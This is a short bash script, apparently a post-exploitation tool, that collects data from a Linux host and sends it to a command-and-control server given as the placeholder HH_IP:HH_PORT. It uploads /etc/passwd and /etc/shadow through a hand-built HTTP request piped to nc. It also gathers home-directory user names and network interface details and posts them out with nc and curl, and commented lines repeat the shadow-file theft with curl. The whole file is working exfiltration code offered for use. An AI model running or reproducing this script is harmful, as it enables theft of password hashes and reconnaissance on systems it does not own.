#!/bin/bash

function UploadToHH(){
  { echo -ne "POST /upload/nc/$(hostname) HTTP/1.1\r\nHost: HH_IP:HH_PORT\r\nContent-Length: $(wc -c < $1)\r\nX-FILE-NAME: $1\r\n\r\n";   cat $1; } | nc HH_IP HH_PORT
}

function Pillage(){
    # # $1 = http://c2:7999/
    # curl -F "file=@/etc/passwd" "${1}upload/generic/$(hostname)"
    # curl -F "file=@/etc/shadow" "${1}upload/generic/$(hostname)"
    UploadToHH /etc/passwd
    UploadToHH /etc/shadow

    echo "Users" >> /tmp/pillage-$(whoami)-$(hostname)
    ls /home >> /tmp/pillage-$(whoami)-$(hostname)

    echo "">> /tmp/pillage-$(whoami)-$(hostname)
    echo "IP Config">> /tmp/pillage-$(whoami)-$(hostname)
    ip -brief a >> /tmp/pillage-$(whoami)-$(hostname)
    
    UploadToHH /tmp/pillage-$(whoami)-$(hostname)

    # i'm not going to replicate this for nc
    # not all systems have curl installed?
    users=$(ls /home)
    network=$(ip -brief a)
    curl -X POST "${1}upload/sysinfo/lin/$(hostname)" -d "users=$users&network=$network"

    
}

Pillage http://HH_IP:HH_PORT/

